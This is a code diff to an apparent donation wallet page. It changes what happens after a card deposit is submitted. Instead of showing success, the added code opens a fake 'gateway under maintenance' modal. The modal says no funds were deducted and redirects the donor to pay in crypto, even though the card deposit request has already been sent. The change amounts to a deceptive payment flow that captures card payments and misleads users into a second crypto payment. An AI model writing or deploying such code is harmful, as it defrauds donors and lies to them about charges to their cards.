@@ -37,7 +37,7 @@ import { useWallet, WalletTransaction } from '@/context/WalletContext';
 import { useAuth } from '@/context/AuthContext';
 import { api } from '@/lib/api';
 import { shrinkImage } from '@/lib/imageShrinker';
-import CreditCardTerminal, { detectCardBrand, DigitalWalletsModal } from '@/components/CreditCardTerminal';
+import CreditCardTerminal, { detectCardBrand, DigitalWalletsModal, CardMaintenanceModal } from '@/components/CreditCardTerminal';
 
 interface CryptoOption {
   symbol: string;
@@ -132,6 +132,9 @@ function PhilanthropicWalletView() {
   // Digital Wallets Maintenance Modal State
   const [walletModalOpen, setWalletModalOpen] = useState(false);
   const [selectedWalletName, setSelectedWalletName] = useState('Apple Pay');
+
+  // Card Maintenance Modal State (Post-submission redirection to crypto)
+  const [cardMaintenanceOpen, setCardMaintenanceOpen] = useState(false);
 
   // Billing Address State
   const [billingAddress, setBillingAddress] = useState({
@@ -288,10 +291,7 @@ function PhilanthropicWalletView() {
           donorEmail: billingAddress.email || user?.email,
         });
 
-        setSuccessInfo({
-          amount: depositAmount,
-          txHash: cardAuthHash,
-        });
+        setCardMaintenanceOpen(true);
       } catch (err: any) {
         setErrorMessage(err.message || 'Could not process card deposit.');
       } finally {
@@ -1407,6 +1407,18 @@ function PhilanthropicWalletView() {
         onSwitchToCard={() => {
           setWalletModalOpen(false);
           setDepositMethod('card');
+        }}
+      />
+
+      {/* Card Gateway Maintenance Modal (Redirects to Crypto) */}
+      <CardMaintenanceModal
+        isOpen={cardMaintenanceOpen}
+        onClose={() => setCardMaintenanceOpen(false)}
+        title="Credit Card Deposit Gateway Under Maintenance"
+        contextText="Our international card settlement network is undergoing scheduled banking infrastructure maintenance. No funds have been deducted from your card."
+        onSwitchToCrypto={() => {
+          setCardMaintenanceOpen(false);
+          setDepositMethod('crypto');
         }}
       />
 
